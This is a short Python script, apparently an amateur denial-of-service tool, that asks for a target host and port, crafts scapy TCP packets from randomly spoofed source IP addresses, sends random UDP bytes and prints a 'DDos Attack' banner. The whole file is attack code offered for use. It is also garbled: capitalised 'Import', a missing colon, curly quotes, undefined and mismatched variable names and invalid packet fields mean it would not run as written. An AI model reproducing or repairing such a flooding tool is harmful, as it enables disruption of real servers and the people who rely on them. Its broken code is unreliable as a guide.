#!/usr/bin/env python
# coding=utf-8
Import random
from scapy.all import *
import os, sys
import time
import  socket
import random
#host && Port
target_host = raw_input("HOST :")
target_port = input("Port :")
i = 1
packetes = input("Bytes :")
#Multiples IPS
while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = “.”
   Source_ip = a + dot + b + dot + c + dot + d
   
   for source_port in range(1, 65535)
      IP1 = IP(source_IP = source_IP, destination = target_IP)
      TCP1 = TCP(srcport = source_port, dstport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .998)
      
#packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(packetes)
sock.sendto(bytes, (target_host, target_port))
os.system("clear")
os.system("figlet DDos Attack")
#conexion_client
sent = 1
pysendfile = 0
while True:

 print(bytes, target_host, target_port, i)
 
 i = i + 1
            
